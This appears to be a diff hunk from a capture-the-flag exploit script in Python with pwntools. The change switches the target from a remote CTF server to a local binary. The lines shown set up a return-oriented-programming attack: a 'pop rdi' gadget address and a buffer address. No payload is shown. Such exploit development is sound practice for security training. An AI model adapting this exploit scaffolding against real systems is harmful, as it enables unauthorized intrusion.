@@ -1,8 +1,8 @@
 from pwn import * 
 from LibcSearcher import * 
 context.log_level = 'debug' 
-# p=process('./pwn2')
-p=remote('t.ctf.qwq.cc',49247)
+p=process('./pwn2')
+# p=remote('t.ctf.qwq.cc',49247)
 elf=ELF('./pwn2')
 pop_rdi=0x0000000000400723              # ROPgadget --binary pwn2 --only 'pop|ret'
 name_addr=0x0000000000601080
